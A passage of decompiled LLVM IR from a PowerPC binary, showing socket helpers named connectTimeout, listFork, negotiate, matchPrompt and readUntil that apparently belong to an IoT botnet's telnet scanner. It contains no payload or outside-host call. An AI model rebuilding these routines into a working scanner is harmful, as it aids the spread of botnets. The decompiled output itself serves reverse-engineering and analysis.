dec_label_pc_100026bc:                            ; preds = %dec_label_pc_100026bc.lr.ph, %dec_label_pc_100026fc
  %storemerge27 = phi i32 [ 0, %dec_label_pc_100026bc.lr.ph ], [ %v1_10002700, %dec_label_pc_100026fc ]
  %v1_100026c0 = mul i32 %storemerge27, 4
  %v2_100026cc = add i32 %v1_100026c0, %arg2
  %v1_100026d0 = inttoptr i32 %v2_100026cc to i32*
  %v2_100026d0 = load i32, i32* %v1_100026d0, align 4
  store i32 268445412, i32* @lr, align 4
  %v4_100026e0 = call i32 @strcasestr(i8* %v3_100026e0, i32 %v2_100026d0, i32 %v2_100026cc)
  %v3_100026e8 = icmp eq i32 %v4_100026e0, 0
  br i1 %v3_100026e8, label %dec_label_pc_100026fc, label %dec_label_pc_10002720.loopexit

dec_label_pc_100026fc:                            ; preds = %dec_label_pc_100026bc
  %v1_10002700 = add nuw nsw i32 %storemerge27, 1
  %v2_10002710 = icmp slt i32 %v1_10002700, %v1_10002688
  br i1 %v2_10002710, label %dec_label_pc_100026bc, label %dec_label_pc_10002720.loopexit

dec_label_pc_10002720.loopexit:                   ; preds = %dec_label_pc_100026fc, %dec_label_pc_100026bc
  %storemerge.ph = phi i32 [ 1, %dec_label_pc_100026bc ], [ 0, %dec_label_pc_100026fc ]
  br label %dec_label_pc_10002720

dec_label_pc_10002720:                            ; preds = %dec_label_pc_10002720.loopexit, %dec_label_pc_10002708.preheader
  %storemerge = phi i32 [ 0, %dec_label_pc_10002708.preheader ], [ %storemerge.ph, %dec_label_pc_10002720.loopexit ]
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %storemerge27, { 1, 0 }
  uselistorder i32 %v1_10002688, { 2, 1, 0, 3 }
  uselistorder label %dec_label_pc_100026bc, { 1, 0 }
}

define i32 @connectTimeout(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  %stack_var_-48 = alloca i32, align 4
  %stack_var_-44 = alloca i32, align 4
  %stack_var_-56 = alloca i32, align 4
  %stack_var_-216 = alloca i32, align 4
  %stack_var_-184 = alloca i32, align 4
  %stack_var_-196 = alloca i32, align 4
  %stack_var_-200 = alloca i32, align 4
  store i32 268445560, i32* @lr, align 4
  %v2_10002774 = call i32 @__libc_fcntl(i32 %arg1, i32 3)
  store i32 ptrtoint (i32* @global_var_100027a0.44 to i32), i32* @lr, align 4
  %v2_1000279c = call i32 @__libc_fcntl(i32 %arg1, i32 4)
  store i32 2, i32* %stack_var_-200, align 4
  %v1_100027ac = urem i32 %arg3, 65536
  store i32 %v1_100027ac, i32* @r3, align 4
  %v1_100027b4 = call i32 @htons(i32 %v1_100027ac)
  %v2_100027c4 = ptrtoint i32* %stack_var_-200 to i32
  %v4_100027d4 = call i32 @getHost(i32 %arg2, i32* nonnull %stack_var_-196, i32 %v2_100027c4)
  %v3_100027dc = icmp eq i32 %v4_100027d4, 0
  br i1 %v3_100027dc, label %dec_label_pc_100027f0, label %dec_label_pc_100027e4

dec_label_pc_100027e4:                            ; preds = %entry
  br label %dec_label_pc_100029b0

dec_label_pc_100027f0:                            ; preds = %entry
  store i32 268445724, i32* @lr, align 4
  %v3_10002818 = call i32 @__libc_connect(i32 %arg1, i32 %v2_100027c4, i32 16)
  %tmp26 = icmp sgt i32 %v3_10002818, -1
  br i1 %tmp26, label %dec_label_pc_1000296c, label %dec_label_pc_10002830

dec_label_pc_10002830:                            ; preds = %dec_label_pc_100027f0
  %v0_10002830 = call i32 @__errno_location()
  %v1_10002838 = inttoptr i32 %v0_10002830 to i32*
  %v2_10002838 = load i32, i32* %v1_10002838, align 4
  %v3_1000283c = icmp eq i32 %v2_10002838, 115
  br i1 %v3_1000283c, label %dec_label_pc_10002844, label %dec_label_pc_10002960

dec_label_pc_10002844:                            ; preds = %dec_label_pc_10002830
  store i32 %arg4, i32* %stack_var_-56, align 4
  %v2_10002854 = ptrtoint i32* %stack_var_-184 to i32
  store i32 %v2_10002854, i32* %stack_var_-216, align 4
  store i32 0, i32* %stack_var_-184, align 4
  br label %dec_label_pc_10002868.dec_label_pc_10002868_crit_edge

dec_label_pc_10002868.dec_label_pc_10002868_crit_edge: ; preds = %dec_label_pc_10002868.dec_label_pc_10002868_crit_edge.dec_label_pc_10002868.dec_label_pc_10002868_crit_edge_crit_edge, %dec_label_pc_10002844
  %v3_1000286c.pre = phi i32 [ %v2_10002854, %dec_label_pc_10002844 ], [ %v3_1000286c.pre.pre, %dec_label_pc_10002868.dec_label_pc_10002868_crit_edge.dec_label_pc_10002868.dec_label_pc_10002868_crit_edge_crit_edge ]
  %v1_1000288430 = phi i32 [ 1, %dec_label_pc_10002844 ], [ %v1_10002884, %dec_label_pc_10002868.dec_label_pc_10002868_crit_edge.dec_label_pc_10002868.dec_label_pc_10002868_crit_edge_crit_edge ]
  %v1_10002870 = mul nuw nsw i32 %v1_1000288430, 4
  %v2_10002874 = add i32 %v1_10002870, %v3_1000286c.pre
  %v2_1000287c = inttoptr i32 %v2_10002874 to i32*
  store i32 0, i32* %v2_1000287c, align 4
  %v1_10002884 = add nuw nsw i32 %v1_1000288430, 1
  %tmp27 = icmp ult i32 %v1_10002884, 32
  br i1 %tmp27, label %dec_label_pc_10002868.dec_label_pc_10002868_crit_edge.dec_label_pc_10002868.dec_label_pc_10002868_crit_edge_crit_edge, label %dec_label_pc_10002898

dec_label_pc_10002868.dec_label_pc_10002868_crit_edge.dec_label_pc_10002868.dec_label_pc_10002868_crit_edge_crit_edge: ; preds = %dec_label_pc_10002868.dec_label_pc_10002868_crit_edge
  %v3_1000286c.pre.pre = load i32, i32* %stack_var_-216, align 4
  br label %dec_label_pc_10002868.dec_label_pc_10002868_crit_edge

dec_label_pc_10002898:                            ; preds = %dec_label_pc_10002868.dec_label_pc_10002868_crit_edge
  %v1_1000289c = udiv i32 %arg1, 32
  %v1_100028a4 = mul nuw nsw i32 %v1_1000289c, 4
  %v2_100028a8 = ptrtoint i32* %stack_var_-216 to i32
  %v2_100028ac = add nuw nsw i32 %v1_100028a4, 32
  %v1_100028b0 = add i32 %v2_100028ac, %v2_100028a8
  %v1_100028b4 = inttoptr i32 %v1_100028b0 to i32*
  %v2_100028b4 = load i32, i32* %v1_100028b4, align 4
  %v1_100028bc = urem i32 %arg1, 32
  %v3_100028c4 = shl i32 1, %v1_100028bc
  %v2_100028c8 = or i32 %v2_100028b4, %v3_100028c4
  store i32 %v2_100028c8, i32* %v1_100028b4, align 4
  %v1_100028e4 = add i32 %arg1, 1
  %v2_100028ec = ptrtoint i32* %stack_var_-56 to i32
  store i32 268445960, i32* @lr, align 4
  %v5_10002904 = call i32 @__libc_select(i32 %v1_100028e4, i32 0, i32 %v2_10002854, i32 0, i32 %v2_100028ec)
  %tmp28 = icmp slt i32 %v5_10002904, 1
  br i1 %tmp28, label %dec_label_pc_10002954, label %dec_label_pc_10002914

dec_label_pc_10002914:                            ; preds = %dec_label_pc_10002898
  store i32 4, i32* %stack_var_-48, align 4
  %v2_1000291c = ptrtoint i32* %stack_var_-44 to i32
  %v2_10002920 = ptrtoint i32* %stack_var_-48 to i32
  store i32 268446012, i32* @lr, align 4
  %v5_10002938 = call i32 @getsockopt(i32 %arg1, i32 1, i32 4, i32 %v2_1000291c, i32 %v2_10002920)
  %v3_1000293c = load i32, i32* %stack_var_-44, align 4
  %v3_10002940 = icmp eq i32 %v3_1000293c, 0
  br i1 %v3_10002940, label %dec_label_pc_1000296c, label %dec_label_pc_10002948

dec_label_pc_10002948:                            ; preds = %dec_label_pc_10002914
  br label %dec_label_pc_100029b0

dec_label_pc_10002954:                            ; preds = %dec_label_pc_10002898
  br label %dec_label_pc_100029b0

dec_label_pc_10002960:                            ; preds = %dec_label_pc_10002830
  br label %dec_label_pc_100029b0

dec_label_pc_1000296c:                            ; preds = %dec_label_pc_10002914, %dec_label_pc_100027f0
  store i32 268446080, i32* @lr, align 4
  %v2_1000297c = call i32 @__libc_fcntl(i32 %arg1, i32 3)
  %v1_1000298c = call i32 @__asm_rlwinm(i32 %v2_1000297c, i32 0, i32 21, i32 19)
  store i32 ptrtoint (i32* @global_var_100029a8.45 to i32), i32* @lr, align 4
  %v2_100029a4 = call i32 @__libc_fcntl(i32 %arg1, i32 4)
  br label %dec_label_pc_100029b0

dec_label_pc_100029b0:                            ; preds = %dec_label_pc_10002960, %dec_label_pc_10002954, %dec_label_pc_10002948, %dec_label_pc_100027e4, %dec_label_pc_1000296c
  %stack_var_-24.0 = phi i32 [ 1, %dec_label_pc_1000296c ], [ 0, %dec_label_pc_10002954 ], [ 0, %dec_label_pc_10002948 ], [ 0, %dec_label_pc_10002960 ], [ 0, %dec_label_pc_100027e4 ]
  ret i32 %stack_var_-24.0

; uselistorder directives
  uselistorder i32 %v1_10002884, { 1, 0 }
  uselistorder i32 %v2_10002854, { 1, 0, 2 }
  uselistorder i32 %v2_100027c4, { 1, 0 }
  uselistorder i32 %v1_100027ac, { 1, 0 }
  uselistorder i32* %stack_var_-200, { 1, 0 }
  uselistorder i32* %stack_var_-216, { 2, 0, 1 }
  uselistorder i32* %stack_var_-56, { 1, 0 }
  uselistorder i32* %stack_var_-48, { 1, 0 }
  uselistorder i32 %arg1, { 4, 5, 2, 3, 1, 0, 6, 7, 8 }
  uselistorder label %dec_label_pc_100029b0, { 4, 0, 1, 2, 3 }
}

define i32 @listFork() local_unnamed_addr {
entry:
  store i32 268446184, i32* @lr, align 4
  %v0_100029e4 = call i32 @__libc_fork()
  %v3_100029f4 = icmp eq i32 %v0_100029e4, 0
  br i1 %v3_100029f4, label %dec_label_pc_10002b78, label %dec_label_pc_10002a08

dec_label_pc_10002a08:                            ; preds = %entry
  %v3_10002a10 = load i32, i32* @global_var_100287dc.47, align 4
  %v2_10002a14 = load i32, i32* @global_var_100287d8.46, align 4
  %v1_10002a18 = add i32 %v3_10002a10, 1
  %v2_10002a18 = icmp eq i32 %v3_10002a10, -1
  %v2_10002a1c = zext i1 %v2_10002a18 to i32
  %v3_10002a1c = add i32 %v2_10002a1c, %v2_10002a14
  store i32 %v3_10002a1c, i32* @global_var_100287d8.46, align 4
  store i32 %v1_10002a18, i32* @global_var_100287dc.47, align 4
  %v1_10002a4c = mul i32 %v1_10002a18, 4
  %v1_10002a54 = add i32 %v1_10002a4c, 4
  store i32 %v1_10002a54, i32* @r3, align 4
  store i32 268446304, i32* @lr, align 4
  %v0_10002a5c = call i32 @malloc()
  br label %dec_label_pc_10002ab4

dec_label_pc_10002a74:                            ; preds = %dec_label_pc_10002ab4, %dec_label_pc_10002b04
  %v1_10002a78 = mul i32 %storemerge2, 4
  %v2_10002a84 = add i32 %v1_10002a78, %v0_10002a5c
  %v3_10002a98 = load i32, i32* @global_var_10028804.48, align 4
  %v2_10002a9c = add i32 %v3_10002a98, %v1_10002a78
  %v1_10002aa0 = inttoptr i32 %v2_10002a9c to i32*
  %v2_10002aa0 = load i32, i32* %v1_10002aa0, align 4
  %v2_10002aa4 = inttoptr i32 %v2_10002a84 to i32*
  store i32 %v2_10002aa0, i32* %v2_10002aa4, align 4
  %v1_10002aac = add i32 %storemerge2, 1
  br label %dec_label_pc_10002ab4

dec_label_pc_10002ab4:                            ; preds = %dec_label_pc_10002a08, %dec_label_pc_10002a74
  %storemerge2 = phi i32 [ 0, %dec_label_pc_10002a08 ], [ %v1_10002aac, %dec_label_pc_10002a74 ]
  %v3_10002adc = load i32, i32* @global_var_100287dc.47, align 4
  %v2_10002ae0 = load i32, i32* @global_var_100287d8.46, align 4
  %v2_10002ae4 = icmp ne i32 %v3_10002adc, 0
  %v3_10002ae8 = add i32 %v2_10002ae0, -1
  %v4_10002ae8 = sext i1 %v2_10002ae4 to i32
  %v3_10002afc = icmp eq i32 %v3_10002ae8, %v4_10002ae8
  br i1 %v3_10002afc, label %dec_label_pc_10002b04, label %dec_label_pc_10002a74

dec_label_pc_10002b04:                            ; preds = %dec_label_pc_10002ab4
  %v1_10002ae4 = add i32 %v3_10002adc, -1
  %v3_10002b1c = icmp ugt i32 %v1_10002ae4, %storemerge2
  br i1 %v3_10002b1c, label %dec_label_pc_10002a74, label %dec_label_pc_10002b24

dec_label_pc_10002b24:                            ; preds = %dec_label_pc_10002b04
  %v1_10002b38 = mul i32 %v3_10002adc, 4
  %v2_10002b44 = add i32 %v0_10002a5c, -4
  %v1_10002b48 = add i32 %v2_10002b44, %v1_10002b38
  %v2_10002b50 = inttoptr i32 %v1_10002b48 to i32*
  store i32 %v0_100029e4, i32* %v2_10002b50, align 4
  %v3_10002b58 = load i32, i32* @global_var_10028804.48, align 4
  store i32 %v3_10002b58, i32* @r3, align 4
  store i32 268446564, i32* @lr, align 4
  %v0_10002b60 = call i32 @free()
  store i32 %v0_10002a5c, i32* @global_var_10028804.48, align 4
  br label %dec_label_pc_10002b78

dec_label_pc_10002b78:                            ; preds = %entry, %dec_label_pc_10002b24
  ret i32 %v0_100029e4

; uselistorder directives
  uselistorder i32 %storemerge2, { 1, 0, 2 }
  uselistorder i32 %v1_10002a78, { 1, 0 }
  uselistorder i32 %v0_10002a5c, { 1, 2, 0 }
  uselistorder i32 %v3_10002a10, { 1, 0 }
  uselistorder label %dec_label_pc_10002b78, { 1, 0 }
  uselistorder label %dec_label_pc_10002ab4, { 1, 0 }
  uselistorder label %dec_label_pc_10002a74, { 1, 0 }
}

define i32 @negotiate(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %stack_var_-56 = alloca i8, align 1
  %v1_10002bbc = add i32 %arg2, 1
  %v1_10002bc0 = inttoptr i32 %v1_10002bbc to i8*
  %v2_10002bc0 = load i8, i8* %v1_10002bc0, align 1
  %v1_10002bd0 = icmp ult i8 %v2_10002bc0, -5
  br i1 %v1_10002bd0, label %dec_label_pc_10002d28, label %dec_label_pc_10002bd8

dec_label_pc_10002bd8:                            ; preds = %entry
  %v2_10002bdc = icmp eq i8 %v2_10002bc0, -1
  br i1 %v2_10002bdc, label %dec_label_pc_10002be4, label %dec_label_pc_10002c00

dec_label_pc_10002be4:                            ; preds = %dec_label_pc_10002bd8
  br label %dec_label_pc_10002d28

dec_label_pc_10002c00:                            ; preds = %dec_label_pc_10002bd8
  store i8 -1, i8* %stack_var_-56, align 1
  %v2_10002c0c = ptrtoint i8* %stack_var_-56 to i32
  store i32 268446752, i32* @lr, align 4
  %v4_10002c1c = call i32 @__libc_send(i32 %arg1, i32 %v2_10002c0c, i32 1, i32 16384)
  %v2_10002c28 = load i8, i8* %v1_10002bc0, align 1
  %v3_10002c30 = icmp eq i8 %v2_10002c28, -4
  br i1 %v3_10002c30, label %dec_label_pc_10002c38, label %dec_label_pc_10002c44

dec_label_pc_10002c38:                            ; preds = %dec_label_pc_10002c00
  store i8 -2, i8* %stack_var_-56, align 1
  br label %dec_label_pc_10002cec

dec_label_pc_10002c44:                            ; preds = %dec_label_pc_10002c00
  %v2_10002c4c = load i8, i8* %v1_10002bc0, align 1
  %v3_10002c54 = icmp eq i8 %v2_10002c4c, -2
  br i1 %v3_10002c54, label %dec_label_pc_10002c5c, label %dec_label_pc_10002c68

dec_label_pc_10002c5c:                            ; preds = %dec_label_pc_10002c44
  store i8 -4, i8* %stack_var_-56, align 1
  br label %dec_label_pc_10002cec

dec_label_pc_10002c68:                            ; preds = %dec_label_pc_10002c44
  %v2_10002c70 = load i8, i8* %v1_10002bc0, align 1
  %v3_10002c78 = icmp eq i8 %v2_10002c70, 3
  br i1 %v3_10002c78, label %dec_label_pc_10002c80, label %dec_label_pc_10002cb8

dec_label_pc_10002c80:                            ; preds = %dec_label_pc_10002c68
  store i8 -3, i8* %stack_var_-56, align 1
  br label %dec_label_pc_10002cec

dec_label_pc_10002cb8:                            ; preds = %dec_label_pc_10002c68
  %v3_10002c90 = icmp eq i8 %v2_10002c70, -3
  %.7 = select i1 %v3_10002c90, i8 -4, i8 -2
  store i8 %.7, i8* %stack_var_-56, align 1
  br label %dec_label_pc_10002cec

dec_label_pc_10002cec:                            ; preds = %dec_label_pc_10002c80, %dec_label_pc_10002c5c, %dec_label_pc_10002c38, %dec_label_pc_10002cb8
  store i32 268446980, i32* @lr, align 4
  %v4_10002d00 = call i32 @__libc_send(i32 %arg1, i32 %v2_10002c0c, i32 1, i32 16384)
  %v1_10002d08 = add i32 %arg2, 2
  store i32 ptrtoint (i32* @global_var_10002d20.49 to i32), i32* @lr, align 4
  %v4_10002d1c = call i32 @__libc_send(i32 %arg1, i32 %v1_10002d08, i32 1, i32 16384)
  br label %dec_label_pc_10002d28

dec_label_pc_10002d28:                            ; preds = %dec_label_pc_10002be4, %dec_label_pc_10002cec, %entry
  ret i32 0

; uselistorder directives
  uselistorder i8* %stack_var_-56, { 5, 4, 3, 2, 0, 1 }
  uselistorder i8 -3, { 1, 0 }
  uselistorder label %dec_label_pc_10002d28, { 1, 0, 2 }
  uselistorder label %dec_label_pc_10002cec, { 3, 0, 1, 2 }
}

define i32 @matchPrompt(i32 %arg1) local_unnamed_addr {
entry:
  store i32 %arg1, i32* @r3, align 4
  %v0_10002d74 = call i32 @__GI_strlen()
  store i32 ptrtoint ([6 x i8]* @global_var_10015658.50 to i32), i32* @r3, align 4
  %v0_10002eb010 = call i32 @__GI_strlen()
  %v2_10002eb812 = icmp eq i32 %v0_10002eb010, 0
  br i1 %v2_10002eb812, label %dec_label_pc_10002ec8, label %dec_label_pc_10002da0.preheader.lr.ph

dec_label_pc_10002da0.preheader.lr.ph:            ; preds = %entry
  %v2_10002dbc = add i32 %v0_10002d74, %arg1
  br label %dec_label_pc_10002da0.preheader

dec_label_pc_10002d94:                            ; preds = %dec_label_pc_10002e28, %dec_label_pc_10002e00, %dec_label_pc_10002dd8, %dec_label_pc_10002db0
  %v1_10002d98 = add nsw i32 %stack_var_-40.08, 1
  %v3_10002da8 = icmp sgt i32 %v0_10002d74, %v1_10002d98
  br i1 %v3_10002da8, label %dec_label_pc_10002db0, label %dec_label_pc_10002e50

dec_label_pc_10002db0:                            ; preds = %dec_label_pc_10002da0.preheader, %dec_label_pc_10002d94
  %stack_var_-40.08 = phi i32 [ %v1_10002d98, %dec_label_pc_10002d94 ], [ %stack_var_-40.115, %dec_label_pc_10002da0.preheader ]
  %v2_10002dc4 = sub i32 %v2_10002dbc, %stack_var_-40.08
  %v1_10002dc8 = inttoptr i32 %v2_10002dc4 to i8*
  %v2_10002dc8 = load i8, i8* %v1_10002dc8, align 1
  %v3_10002dd0 = icmp eq i8 %v2_10002dc8, 0
  br i1 %v3_10002dd0, label %dec_label_pc_10002d94, label %dec_label_pc_10002dd8

dec_label_pc_10002dd8:                            ; preds = %dec_label_pc_10002db0
  %v2_10002df0 = load i8, i8* %v1_10002dc8, align 1
  %v3_10002df8 = icmp eq i8 %v2_10002df0, 32
  br i1 %v3_10002df8, label %dec_label_pc_10002d94, label %dec_label_pc_10002e00

dec_label_pc_10002e00:                            ; preds = %dec_label_pc_10002dd8
  %v2_10002e18 = load i8, i8* %v1_10002dc8, align 1
  %v3_10002e20 = icmp eq i8 %v2_10002e18, 13
  br i1 %v3_10002e20, label %dec_label_pc_10002d94, label %dec_label_pc_10002e28

dec_label_pc_10002e28:                            ; preds = %dec_label_pc_10002e00
  %v2_10002e40 = load i8, i8* %v1_10002dc8, align 1
  %v3_10002e48 = icmp eq i8 %v2_10002e40, 10
  br i1 %v3_10002e48, label %dec_label_pc_10002d94, label %dec_label_pc_10002e50

dec_label_pc_10002e50:                            ; preds = %dec_label_pc_10002e28, %dec_label_pc_10002d94, %dec_label_pc_10002da0.preheader
  %stack_var_-40.0.lcssa = phi i32 [ %stack_var_-40.115, %dec_label_pc_10002da0.preheader ], [ %stack_var_-40.08, %dec_label_pc_10002e28 ], [ %v1_10002d98, %dec_label_pc_10002d94 ]
  %v2_10002e64 = sub i32 %v2_10002dbc, %stack_var_-40.0.lcssa
  %v1_10002e68 = inttoptr i32 %v2_10002e64 to i8*
  %v2_10002e68 = load i8, i8* %v1_10002e68, align 1
  %v2_10002e7c = add i32 %storemerge316, ptrtoint ([6 x i8]* @global_var_10015658.50 to i32)
  %v1_10002e80 = inttoptr i32 %v2_10002e7c to i8*
  %v2_10002e80 = load i8, i8* %v1_10002e80, align 1
  %v4_10002e88 = icmp eq i8 %v2_10002e68, %v2_10002e80
  br i1 %v4_10002e88, label %dec_label_pc_10002ec8, label %dec_label_pc_10002e9c

dec_label_pc_10002e9c:                            ; preds = %dec_label_pc_10002e50
  %v1_10002ea0 = add i32 %storemerge316, 1
  store i32 ptrtoint ([6 x i8]* @global_var_10015658.50 to i32), i32* @r3, align 4
  %v0_10002eb0 = call i32 @__GI_strlen()
  %v2_10002eb8 = icmp ult i32 %v1_10002ea0, %v0_10002eb0
  br i1 %v2_10002eb8, label %dec_label_pc_10002da0.preheader, label %dec_label_pc_10002ec8

dec_label_pc_10002da0.preheader:                  ; preds = %dec_label_pc_10002da0.preheader.lr.ph, %dec_label_pc_10002e9c
  %storemerge316 = phi i32 [ 0, %dec_label_pc_10002da0.preheader.lr.ph ], [ %v1_10002ea0, %dec_label_pc_10002e9c ]
  %stack_var_-40.115 = phi i32 [ 0, %dec_label_pc_10002da0.preheader.lr.ph ], [ %stack_var_-40.0.lcssa, %dec_label_pc_10002e9c ]
  %v3_10002da86 = icmp sgt i32 %v0_10002d74, %stack_var_-40.115
  br i1 %v3_10002da86, label %dec_label_pc_10002db0, label %dec_label_pc_10002e50

dec_label_pc_10002ec8:                            ; preds = %entry, %dec_label_pc_10002e50, %dec_label_pc_10002e9c
  %storemerge = phi i32 [ 0, %entry ], [ 1, %dec_label_pc_10002e50 ], [ 0, %dec_label_pc_10002e9c ]
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %stack_var_-40.115, { 2, 0, 1 }
  uselistorder i32 %storemerge316, { 1, 0 }
  uselistorder i32 %v1_10002ea0, { 1, 0 }
  uselistorder i32 %v0_10002d74, { 1, 2, 0 }
  uselistorder i32 ptrtoint ([6 x i8]* @global_var_10015658.50 to i32), { 2, 1, 0 }
  uselistorder label %dec_label_pc_10002ec8, { 2, 1, 0 }
  uselistorder label %dec_label_pc_10002da0.preheader, { 1, 0 }
  uselistorder label %dec_label_pc_10002e50, { 2, 0, 1 }
}

define i32 @readUntil(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7) local_unnamed_addr {
entry:
  %stack_var_-64 = alloca i32, align 4
  %stack_var_-216 = alloca i32, align 4
  %stack_var_-192 = alloca i32, align 4
  %v0_10002f1c = load i32, i32* @r10, align 4
  store i32 %arg4, i32* %stack_var_-64, align 4
  %v1_1000315c5 = add i32 %v0_10002f1c, 2
  %v2_100031646 = icmp slt i32 %v1_1000315c5, %arg7
  br i1 %v2_100031646, label %dec_label_pc_1000316c.lr.ph, label %dec_label_pc_1000319c

dec_label_pc_1000316c.lr.ph:                      ; preds = %entry
  %v2_10002f54 = ptrtoint i32* %stack_var_-192 to i32
  %v1_10002f9c = udiv i32 %arg1, 32
  %v1_10002fa4 = mul nuw nsw i32 %v1_10002f9c, 4
  %v2_10002fa8 = ptrtoint i32* %stack_var_-216 to i32
  %v2_10002fac = add nuw nsw i32 %v1_10002fa4, 24
  %v1_10002fb0 = add i32 %v2_10002fac, %v2_10002fa8
  %v1_10002fb4 = inttoptr i32 %v1_10002fb0 to i32*
  %v1_10002fbc = urem i32 %arg1, 32
  %v3_10002fc4 = shl i32 1, %v1_10002fbc
  %v1_10002fe4 = add i32 %arg1, 1
  %v2_10002fec = ptrtoint i32* %stack_var_-64 to i32
  %v4_1000311c = inttoptr i32 %arg2 to i8*
  %v3_10003130 = icmp eq i32 %arg3, 0
  %v2_1000317c = icmp sgt i32 %arg5, 0
  br label %dec_label_pc_1000316c

dec_label_pc_10002f54:                            ; preds = %dec_label_pc_10003178, %dec_label_pc_1000316c
  store i32 %v2_10002f54, i32* %stack_var_-216, align 4
  store i32 0, i32* %stack_var_-192, align 4
  br label %dec_label_pc_10002f68.dec_label_pc_10002f68_crit_edge

dec_label_pc_10002f68.dec_label_pc_10002f68_crit_edge: ; preds = %dec_label_pc_10002f68.dec_label_pc_10002f68_crit_edge.dec_label_pc_10002f68.dec_label_pc_10002f68_crit_edge_crit_edge, %dec_label_pc_10002f54
  %v3_10002f6c.pre = phi i32 [ %v2_10002f54, %dec_label_pc_10002f54 ], [ %v3_10002f6c.pre.pre, %dec_label_pc_10002f68.dec_label_pc_10002f68_crit_edge.dec_label_pc_10002f68.dec_label_pc_10002f68_crit_edge_crit_edge ]
  %v1_10002f8436 = phi i32 [ 1, %dec_label_pc_10002f54 ], [ %v1_10002f84, %dec_label_pc_10002f68.dec_label_pc_10002f68_crit_edge.dec_label_pc_10002f68.dec_label_pc_10002f68_crit_edge_crit_edge ]
  %v1_10002f70 = mul nuw nsw i32 %v1_10002f8436, 4
  %v2_10002f74 = add i32 %v1_10002f70, %v3_10002f6c.pre
  %v2_10002f7c = inttoptr i32 %v2_10002f74 to i32*
  store i32 0, i32* %v2_10002f7c, align 4
  %v1_10002f84 = add nuw nsw i32 %v1_10002f8436, 1
  %tmp33 = icmp ult i32 %v1_10002f84, 32
  br i1 %tmp33, label %dec_label_pc_10002f68.dec_label_pc_10002f68_crit_edge.dec_label_pc_10002f68.dec_label_pc_10002f68_crit_edge_crit_edge, label %dec_label_pc_10002f98

dec_label_pc_10002f68.dec_label_pc_10002f68_crit_edge.dec_label_pc_10002f68.dec_label_pc_10002f68_crit_edge_crit_edge: ; preds = %dec_label_pc_10002f68.dec_label_pc_10002f68_crit_edge
  %v3_10002f6c.pre.pre = load i32, i32* %stack_var_-216, align 4
  br label %dec_label_pc_10002f68.dec_label_pc_10002f68_crit_edge

dec_label_pc_10002f98:                            ; preds = %dec_label_pc_10002f68.dec_label_pc_10002f68_crit_edge
  %v2_10002fb4 = load i32, i32* %v1_10002fb4, align 4
  %v2_10002fc8 = or i32 %v2_10002fb4, %v3_10002fc4
  store i32 %v2_10002fc8, i32* %v1_10002fb4, align 4
  store i32 268447752, i32* @lr, align 4
  %v5_10003004 = call i32 @__libc_select(i32 %v1_10002fe4, i32 %v2_10002f54, i32 0, i32 0, i32 %v2_10002fec)
  %tmp34 = icmp slt i32 %v5_10003004, 1
  br i1 %tmp34, label %dec_label_pc_1000319c, label %dec_label_pc_10003014

dec_label_pc_10003014:                            ; preds = %dec_label_pc_10002f98
  %v2_10003020 = add i32 %stack_var_-196.09, %arg6
  store i32 268447804, i32* @lr, align 4
  %v4_10003038 = call i32 @__libc_recv(i32 %arg1, i32 %v2_10003020, i32 1, i32 0)
  %v4_1000304c = icmp eq i32 %v4_10003038, -1
  br i1 %v4_1000304c, label %dec_label_pc_10003060, label %dec_label_pc_10003054

dec_label_pc_10003054:                            ; preds = %dec_label_pc_10003014
  %v3_10003058 = icmp eq i32 %v4_10003038, 0
  br i1 %v3_10003058, label %dec_label_pc_10003060, label %dec_label_pc_1000306c

dec_label_pc_10003060:                            ; preds = %dec_label_pc_10003054, %dec_label_pc_10003014
  br label %dec_label_pc_100031a4

dec_label_pc_1000306c:                            ; preds = %dec_label_pc_10003054
  %v2_10003074 = add i32 %v4_10003038, %stack_var_-196.09
  %v4_1000307c = inttoptr i32 %v2_10003020 to i8*
  %v3_10003080 = load i8, i8* %v4_1000307c, align 1
  %v3_10003088 = icmp eq i8 %v3_10003080, -1
  br i1 %v3_10003088, label %dec_label_pc_10003090, label %dec_label_pc_10003114

dec_label_pc_10003090:                            ; preds = %dec_label_pc_1000306c
  %v1_10003094 = add i32 %v2_10003020, 1
  store i32 268447916, i32* @lr, align 4
  %v4_100030a8 = call i32 @__libc_recv(i32 %arg1, i32 %v1_10003094, i32 2, i32 0)
  %v4_100030bc = icmp eq i32 %v4_100030a8, -1
  br i1 %v4_100030bc, label %dec_label_pc_100030d0, label %dec_label_pc_100030c4

dec_label_pc_100030c4:                            ; preds = %dec_label_pc_10003090
  %v3_100030c8 = icmp eq i32 %v4_100030a8, 0
  br i1 %v3_100030c8, label %dec_label_pc_100030d0, label %dec_label_pc_100030dc

dec_label_pc_100030d0:                            ; preds = %dec_label_pc_100030c4, %dec_label_pc_10003090
  br label %dec_label_pc_100031a4

dec_label_pc_100030dc:                            ; preds = %dec_label_pc_100030c4
  %v2_100030e4 = add i32 %v4_100030a8, %v2_10003074
  store i32 268447996, i32* @lr, align 4
  %v4_100030f8 = call i32 @negotiate(i32 %arg1, i32 %v2_10003020, i32 3, i32 %v2_10003074)
  %v3_10003100 = icmp eq i32 %v4_100030f8, 0
  br i1 %v3_10003100, label %dec_label_pc_10003108, label %dec_label_pc_10003158.backedge

dec_label_pc_10003108:                            ; preds = %dec_label_pc_100030dc
  br label %dec_label_pc_100031a4

dec_label_pc_10003114:                            ; preds = %dec_label_pc_1000306c
  store i32 268448032, i32* @lr, align 4
  %v5_1000311c = call i32 @strstr(i32 %arg6, i8* %v4_1000311c, i32 %v2_10003020)
  %v3_10003124 = icmp eq i32 %v5_1000311c, 0
  br i1 %v3_10003124, label %dec_label_pc_1000312c, label %dec_label_pc_10003190

dec_label_pc_1000312c:                            ; preds = %dec_label_pc_10003114
  br i1 %v3_10003130, label %dec_label_pc_10003158.backedge, label %dec_label_pc_10003138

dec_label_pc_10003158.backedge:                   ; preds = %dec_label_pc_1000312c, %dec_label_pc_10003138, %dec_label_pc_100030dc
  %stack_var_-196.0.be = phi i32 [ %v2_100030e4, %dec_label_pc_100030dc ], [ %v2_10003074, %dec_label_pc_1000312c ], [ %v2_10003074, %dec_label_pc_10003138 ]
  %v1_1000315c = add i32 %stack_var_-196.0.be, 2
  %v2_10003164 = icmp slt i32 %v1_1000315c, %arg7
